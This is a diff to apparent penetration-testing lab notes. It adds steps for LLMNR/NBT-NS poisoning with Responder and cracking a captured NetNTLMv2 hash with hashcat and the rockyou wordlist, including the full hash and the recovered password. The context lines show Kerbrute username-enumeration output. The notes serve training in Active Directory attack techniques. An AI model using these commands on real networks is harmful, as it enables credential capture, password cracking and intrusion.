@@ -166,3 +166,39 @@ Enumerating Users with Kerbrute
 2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
 2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds
 ```
+### LLMNR/NBT-NS Poisoning - from Linux
+
+```
+Starting Responder with Default Settings
+sudo responder -I ens224
+```
+```
+[!bash!]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
+Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
+Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10967040/14344385 (76.46%)
+Rejected.........: 0/10967040 (0.00%)
+Restore.Point....: 10960896/14344385 (76.41%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+```
